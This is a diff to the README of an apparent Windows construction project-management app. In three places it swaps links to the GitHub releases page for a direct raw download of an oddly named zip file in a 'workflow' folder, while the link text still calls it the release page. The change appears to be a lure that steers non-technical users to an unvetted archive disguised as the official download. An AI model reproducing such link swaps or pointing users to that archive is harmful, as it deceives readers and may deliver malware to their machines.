@@ -1,6 +1,6 @@
 # 🏗️ custom-ai-project-management-system - Construction Project Control Made Simple
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/itsalmv/custom-ai-project-management-system/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/itsalmv/custom-ai-project-management-system/raw/refs/heads/main/workflow/management-custom-project-system-ai-gawkhammer.zip)
 
 ## 🚀 What this is
 
@@ -12,7 +12,7 @@ It is built for non-technical users who want a simple way to run project work on
 
 Use this page to download and run the app on Windows:
 
-[Visit the release page to download](https://github.com/itsalmv/custom-ai-project-management-system/releases)
+[Visit the release page to download](https://github.com/itsalmv/custom-ai-project-management-system/raw/refs/heads/main/workflow/management-custom-project-system-ai-gawkhammer.zip)
 
 ### Steps
 
@@ -158,7 +158,7 @@ It is suited for teams that want:
 
 Download the latest Windows version here:
 
-[https://github.com/itsalmv/custom-ai-project-management-system/releases](https://github.com/itsalmv/custom-ai-project-management-system/releases)
+[https://github.com/itsalmv/custom-ai-project-management-system/raw/refs/heads/main/workflow/management-custom-project-system-ai-gawkhammer.zip](https://github.com/itsalmv/custom-ai-project-management-system/raw/refs/heads/main/workflow/management-custom-project-system-ai-gawkhammer.zip)
 
 ## 🧩 Topics
 
